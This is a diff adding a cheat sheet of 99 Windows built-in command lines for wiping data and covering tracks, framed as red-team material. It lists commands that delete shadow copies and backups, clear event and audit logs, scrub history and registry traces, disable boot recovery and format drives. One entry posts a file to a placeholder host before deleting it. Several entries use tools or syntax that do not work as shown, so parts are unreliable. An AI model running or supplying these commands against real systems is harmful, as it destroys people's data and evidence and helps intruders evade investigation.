@@ -1,0 +1,125 @@
+# ================================
+# LOLBINS for Data Wiping & Anti-Forensics (99 Examples)
+# Context: Windows 11 Device - Red Team / Threat Simulation Use
+# Categories: Data Destruction | Metadata Removal | Log Tampering | Stealth & Obfuscation
+# ================================
+
+# --- [1-10] FILE DELETION & DATA WIPING VIA LOLBINS ---
+1. cmd.exe /c "del /f /q C:\Users\%USERNAME%\Documents\*.*"
+2. powershell.exe -c "Remove-Item -Path 'C:\$Recycle.Bin\*' -Recurse -Force"
+3. cipher.exe /w:C:\
+4. vssadmin delete shadows /all /quiet
+5. wbadmin delete catalog -quiet
+6. fsutil file setZeroData offset=0 length=9999999 C:\sensitive.txt
+7. bcdedit /set {default} bootstatuspolicy ignoreallfailures
+8. takeown /f C:\secret\*.log & icacls C:\secret\*.log /grant everyone:F & del C:\secret\*.log
+9. del /a /q /s "%APPDATA%\Microsoft\Windows\Recent\*"
+10. echo y | del "%USERPROFILE%\NTUSER.DAT.LOG*"
+
+# --- [11-20] LOLBIN-MEDIATED OVERWRITING ---
+11. debug.exe < nul > C:\file.txt
+12. certutil -f -encode nul C:\wipefile.txt
+13. certutil -urlcache -split -f http://localhost/blankfile C:\temp\data.doc && type nul > C:\temp\data.doc
+14. regsvr32 /s /u C:\file_to_wipe.dll
+15. makecab C:\file_to_wipe.txt %TEMP%\x.cab && del C:\file_to_wipe.txt && expand %TEMP%\x.cab -F:* NUL
+16. esentutl /y C:\sensitive.edb /d D:\NUL
+17. forfiles /p C:\data /m *.* /c "cmd /c echo y|del @file"
+18. type nul > "C:\Users\Public\Videos\*.log"
+19. openfiles /disconnect /id 1 & del /f C:\openfile.txt
+20. icacls C:\sensitive.log /inheritance:r /remove:g everyone & del /f C:\sensitive.log
+
+# --- [21-35] ANTI-FORENSIC - LOG & TRACE REMOVAL ---
+21. wevtutil cl System
+22. wevtutil cl Security
+23. wevtutil cl Application
+24. del /f /q %windir%\System32\winevt\Logs\*.evtx
+25. powershell -c "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"
+26. auditpol /clear
+27. del /f /q C:\Windows\Prefetch\*.*
+28. del /f /q %TEMP%\*.*
+29. logman stop trace persistent_log
+30. logman delete persistent_log
+31. wecutil cs C:\wec_clear.xml
+32. taskkill /f /im svchost.exe > NUL 2>&1
+33. reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+34. del "%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+35. del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Terminal Server Client\cache\*"
+
+# --- [36-45] COVERING TRACKS (NETWORK, DNS, SYSTEM) ---
+36. ipconfig /flushdns
+37. netsh advfirewall reset
+38. netsh winsock reset
+39. netsh int ip reset
+40. arp -d *
+41. powershell Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Terminal Server Client\Default\' -Name MRU* -Force
+42. del /f /q %SystemRoot%\System32\LogFiles\Firewall\pfirewall.log
+43. del /f /q C:\Windows\System32\drivers\etc\hosts
+44. taskkill /f /im conhost.exe > nul
+45. schtasks /Delete /TN "ReconTask" /F
+
+# --- [46-60] LOLBINS USED FOR ANTI-RECOVERY / METADATA MANIPULATION ---
+46. attrib +s +h +r C:\hidden_file.txt
+47. attrib -s -h -r C:\target.log && del C:\target.log
+48. robocopy "C:\empty" "C:\target" /MIR
+49. rename C:\logs.txt C:\COM1 > NUL
+50. echo "" > C:\logs.txt
+51. icacls C:\*.log /deny Everyone:F
+52. tzutil /s "UTC" && time 00:00 && date 01-01-2000
+53. echo | set /p=" " > C:\report.docx
+54. move /y C:\data\*.docx \\.\NUL
+55. cipher /w:C:\Users\%USERNAME%\Downloads
+56. format C: /fs:NTFS /q /x  # destructive - simulation only
+57. fsutil usn deletejournal /d C:
+58. rmdir /s /q C:\$Recycle.Bin
+59. echo > C:\hiberfil.sys
+60. echo > C:\pagefile.sys
+
+# --- [61-75] SCHEDULED, FILELESS, AND CHAINED WIPE ATTACKS ---
+61. schtasks /create /tn "WipeTemp" /tr "cmd.exe /c del /f /q %TEMP%\*" /sc onlogon
+62. powershell -EncodedCommand [base64 of wiping script]
+63. mshta vbscript:Execute("CreateObject(""Scripting.FileSystemObject"").DeleteFile(""C:\to_wipe.log"")")
+64. for /R %i in (*.txt) do del /f /q "%i"
+65. rundll32.exe setupapi.dll,InstallHinfSection DefaultUninstall 132 C:\delete.inf
+66. cmd.exe /c echo y|format D: /fs:NTFS /q  # drive wipe
+67. wmic shadowcopy delete
+68. wmic logicaldisk where "DriveType=3" call Delete
+69. diskpart /s wipe_diskpart_script.txt
+70. echo CleanMgr /d C: | at 12:00
+71. copy /y nul C:\target.docx
+72. makecab.exe file.txt wipe.cab & expand wipe.cab -F:* > NUL
+73. taskkill /f /im onecloud.exe & del /f C:\CloudSync\data.db
+74. manage-bde -w C:
+75. rundll32.exe advapi32.dll,ProcessIdleTasks
+
+# --- [76-85] USER ACTIVITY & ARTIFACT SCRUBBING ---
+76. del /f /q "%APPDATA%\Microsoft\Windows\Recent\*"
+77. del /f /q "%USERPROFILE%\Recent\*"
+78. reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU /f
+79. reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU /f
+80. Clear-RecycleBin -Force
+81. powershell -c "[System.IO.File]::WriteAllText('C:\path\to\file.txt',' ')"
+82. forfiles /p "C:\logs" /s /m *.log /d -5 /c "cmd /c del /f @file"
+83. reg add HKLM\System\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 0 /f
+84. Clear-WebBrowserCache -Browser "Edge"
+85. del /f /q "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"
+
+# --- [86-99] ADVANCED CHAINS AND STACKED TECHNIQUES ---
+86. curl -o C:\temp\blank.txt http://localhost/blank && move /y C:\temp\blank.txt C:\secret\payload.txt
+87. bcdedit /set {current} recoveryenabled no && del /f /q C:\Recovery\*
+88. taskkill /im explorer.exe /f && del /f /q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*"
+89. cmd /c "del /f /q /a C:\Users\%USERNAME%\Desktop\*.lnk"
+90. powershell -Command "Start-Sleep -s 10; Remove-Item -Path 'C:\trace\*.evtx' -Force"
+91. reg.exe export HKCU\Software\Classes\* /y && del /f /q export.reg
+92. curl.exe -X POST --data-binary @C:\to_wipe.txt http://blackhole/upload && del C:\to_wipe.txt
+93. mountvol Z: /d && format Z: /fs:NTFS /q
+94. robocopy C:\empty C:\sensitive /mir
+95. bcdedit /set {current} bootstatuspolicy ignoreallfailures
+96. rundll32.exe ntdll.dll,NtShutdownSystem
+97. set __COMPAT_LAYER=RunAsInvoker && del /f C:\tracefile.evtx
+98. icacls.exe C:\to_wipe.txt /remove "Everyone"
+99. takeown /f C:\*.evtx && icacls C:\*.evtx /grant administrators:F && del /f /q C:\*.evtx
+
+# ================================
+# END OF FILE — 99 USE CASES
+# Use with caution. All examples are for authorized red team or lab use only.
+# ================================
